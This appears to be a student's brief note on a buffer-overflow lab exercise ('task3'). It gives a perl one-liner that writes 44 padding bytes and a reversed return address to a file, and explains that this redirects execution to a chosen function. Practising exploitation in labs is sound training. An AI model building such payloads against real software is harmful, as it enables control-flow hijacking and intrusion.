task3:
perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; print "\xc9\x61\x55\x56";' > /tmp/task3input

the ending is the return address being replaced with the address of the function we want to run

in this case the addr is 0x565561c9 but we need to reverse it and then overflow to it
idk why we need to reverse it but we do. 44 A's and the addr
